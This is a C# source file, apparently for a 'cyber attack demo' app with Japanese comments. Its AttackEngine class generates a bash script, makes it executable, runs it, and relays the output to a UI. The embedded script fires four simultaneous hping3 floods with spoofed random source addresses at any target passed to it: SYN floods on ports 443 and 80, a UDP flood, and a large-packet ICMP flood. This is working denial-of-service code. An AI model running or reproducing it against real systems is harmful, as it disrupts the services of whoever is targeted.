using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public class AttackEngine
    {
        // ログ出力イベント（UIに通知するため）
        public event Action<string>? OnLogReceived;
        
        private const string AttackScriptName = @"/Attack/attack.sh";

        // 外部コマンド実行
        public async Task RunCommandAsync(string command, string args)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = new Process { StartInfo = psi };

                // 標準出力
                process.OutputDataReceived += (s, e) => 
                {
                    if (e.Data != null)
                    {
                        // ここで翻訳ロジックを通す
                        string translated = LogTranslator.Translate(e.Data);
                        OnLogReceived?.Invoke(translated);
                    }
                };
                
                // エラー出力
                process.ErrorDataReceived += (s, e) =>
                {
                    if (e.Data != null) OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                await process.WaitForExitAsync();
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Command Execution Failed: {ex.Message}");
                
                // デモ用フォールバックメッセージ
                await Task.Delay(1000);
                if (command.Contains("bash") || args.Contains("attack.sh"))
                {
                     OnLogReceived?.Invoke("[SIMULATION] Executing shell script sequence...");
                }
                else
                {
                    OnLogReceived?.Invoke("Target appears to be secure or tool not installed.");
                }
            }
        }

        // 攻撃用シェルスクリプトの生成
        public async Task EnsureAttackScriptExistsAsync()
        {
            try
            {
                // 毎回生成して常に最新の状態にする（設定変更への対応などはここで行う）
                // 既存のファイルがあっても上書きするロジックに変更しても良いが、今回は「なければ作る」維持
                if (!File.Exists(AttackScriptName))
                {
                    string scriptContent = @"#!/bin/bash
# 引数の取得（デフォルト値を設定）
TARGET=${1:-""127.0.0.1""}
DURATION=${2:-""15""}

# 実行権限チェック
if [ ""$EUID"" -ne 0 ]; then 
  echo ""[!] WARNING: This script requires root privileges for hping3.""
fi

echo ""==========================================""
echo ""[*] TARGET: $TARGET""
echo ""[*] DURATION: ${DURATION}s""
echo ""==========================================""

echo ""[*] LAUNCHING 4 PARALLEL VECTORS...""

# 1. TCP SYN Flood (Port 443)
timeout ${DURATION}s hping3 -S -p 443 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID1=$!
echo ""[+] Vector 1 (TCP/443) Fired (PID: $PID1)""

# 2. TCP SYN Flood (Port 80)
timeout ${DURATION}s hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID2=$!
echo ""[+] Vector 2 (TCP/80)  Fired (PID: $PID2)""

# 3. UDP Flood
timeout ${DURATION}s hping3 --udp --flood --rand-source $TARGET > /dev/null 2>&1 &
PID3=$!
echo ""[+] Vector 3 (UDP)     Fired (PID: $PID3)""

# 4. ICMP Large Packet Flood
timeout ${DURATION}s hping3 -1 --flood -d 1200 --rand-source $TARGET > /dev/null 2>&1 &
PID4=$!
echo ""[+] Vector 4 (ICMP)    Fired (PID: $PID4)""

echo ""------------------------------------------""
echo ""[!] ALL GUNS BLAZING. HOLDING FIRE FOR ${DURATION}s...""

wait $PID1 $PID2 $PID3 $PID4
echo ""[*] CEASE FIRE. ATTACK COMPLETE.""
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    
                    // 実行権限付与
                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
                    
                    OnLogReceived?.Invoke($"[SYSTEM] Generated attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }
    }
}